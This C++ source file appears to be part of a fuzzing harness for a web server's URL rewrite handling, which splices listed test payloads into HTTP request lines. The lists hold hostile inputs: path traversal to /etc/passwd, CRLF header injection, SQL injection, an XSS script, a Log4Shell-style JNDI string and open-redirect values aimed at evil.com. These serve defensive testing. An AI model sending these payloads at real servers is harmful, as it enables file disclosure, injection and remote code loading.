#include "proto_converters/converters.h"
#include "rewrite_request.pb.h"
#include <cstring>
#include <string>


static const char *uri_payloads[] = {
    "/a/foo/bar/baz",
    "/a/../../etc/passwd",
    "/a/%2e%2e/%2e%2e/etc/passwd",
    "/a/a%00b",
    "/a",
    "/a/HELLO",
    "/a/AbCdEfGhIjKlMnOpQrStUvWxYz",
    "/a/FOO%2FBAR",
    "/a/hello-world",
    "/a/admin/edit/12345",
    "/a/a%00b/c%0dd/e%0af",
    "/a/AAAAAAAAAAAAAAAA/BBBBBBBBBBBBBBBB/CCCCCCCCCCCCCCCC",
    "/a/test",
    "/a/foo%26bar=baz",
    "/b/clean/page",
    "/b/track/payload$1%{QUERY_STRING}",
    "/b/setcookie/value%3bsecure%3bhttponly",
    "/b/chain/data",
    "/b/download/file.dat",
    "/b/cgi/test.cgi",
    "/b/xxxxxxxxxx",
    "/b/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
    "/b/xxxfoo",
    "/b/catchall/anything",
    "/",
    "",
    "/c/../../../etc/passwd",
    "/a?b#c",
    "/d/%2e%2e/%2e%2e/%2e%2e/%2e%2e/",
    "/d/rewrite/../rewrite/../rewrite",
    "/d/escape/%00%01%02%03%04%05%06%07%08%09%0a%0b%0c%0d%0e%0f",
    "/d/old/foo%20bar%09baz%0d%0aqux",
    "/d/upper/%C3%BC%C3%B6%C3%A4",
    "/d/search/%E2%80%8B",
    "/d/user/%252F/%252F/%252F",
    "/d/nested/%2500%2501%2502",
    "/escape/a b c d e f g h",
    "/old/foo%ff%fe%fd",
    "/chain/test%0d%0aX-Injected: yes",
    "/track/$1%{QUERY_STRING}%1%2%3",
    "/setcookie/val%3B%20domain%3D.evil.com",
};
static const int num_uris = sizeof(uri_payloads) / sizeof(uri_payloads[0]);

static const char *qs_payloads[] = {
    "id=42",
    "id=99999999999999999",
    "id=-1",
    "id=0",
    "id=abc",
    "needle",
    "a=1&b=2&c=3&d=4&e=5&f=6&g=7&h=8",
    "foo=bar%00baz",
    "key=%0d%0aInjected-Header:%20value",
    "q=hello+world&lang=en",
    "redirect=http://evil.com",
    "path=../../../etc/passwd",
    "",
    "a=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "%00=%00",
    "id=1%27%20OR%201%3D1",
    "term=<script>alert(1)</script>",
    "x=1&x=2&x=3&x=4&x=5",
};
static const int num_qs = sizeof(qs_payloads) / sizeof(qs_payloads[0]);

static const char *seg_mutations[] = {
    "..",
    ".",
    "%2e%2e",
    "%00",
    "AAAA",
    "a%00b",
    "${jndi:ldap://evil}",
    "%0d%0a",
    "\\",
    "//",
    "a",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
};
static const int num_seg_mutations = sizeof(seg_mutations) / sizeof(seg_mutations[0]);

void ApplyRewrite(const RewriteRequest &rw, std::string &request)
{
    std::string uri;

    if (rw.has_use_long_path() && rw.use_long_path()) {
        uint32_t variant = rw.long_path_variant() % 4;
        uint32_t depth = rw.long_path_depth();
        if (depth < 10)
            depth = 10;
        if (depth > 500)
            depth = 500;

        if (variant == 0) {
            for (uint32_t i = 0; i < depth; i++) {
                uri += '/';
                uri += ('a' + i % 26);
            }
        } else if (variant == 1) {
            uri = "/";
            for (uint32_t i = 0; i < depth; i++)
                uri += ('A' + i % 26);
        } else if (variant == 2) {
            uri = "/";
            uri.append(depth, 'x');
        } else {
            for (uint32_t i = 0; i < depth; i++)
                uri += "/..";
        }
    } else if (rw.has_uri_override()) {
        int idx = rw.uri_override() % num_uris;
        uri = uri_payloads[idx];

        if (rw.has_query_override()) {
            int qidx = rw.query_override() % num_qs;
            uri += "?";
            uri += qs_payloads[qidx];
        }

        if (rw.has_path_segment_mutation()) {
            int sidx = rw.path_segment_mutation() % num_seg_mutations;
            size_t slash = uri.find('/', 1);
            if (slash != std::string::npos) {
                size_t next = uri.find('/', slash + 1);
                if (next == std::string::npos)
                    next = uri.size();
                uri.replace(slash + 1, next - slash - 1, seg_mutations[sidx]);
            }
        }
    }

    if (uri.empty())
        return;

    size_t rl_end = request.find("\r\n");
    if (rl_end == std::string::npos)
        return;

    std::string request_line = request.substr(0, rl_end);
    size_t sp1 = request_line.find(' ');
    if (sp1 == std::string::npos)
        return;
    size_t sp2 = request_line.find(' ', sp1 + 1);
    if (sp2 == std::string::npos)
        return;

    std::string new_line = request_line.substr(0, sp1 + 1) + uri + request_line.substr(sp2);
    request.replace(0, rl_end, new_line);
}
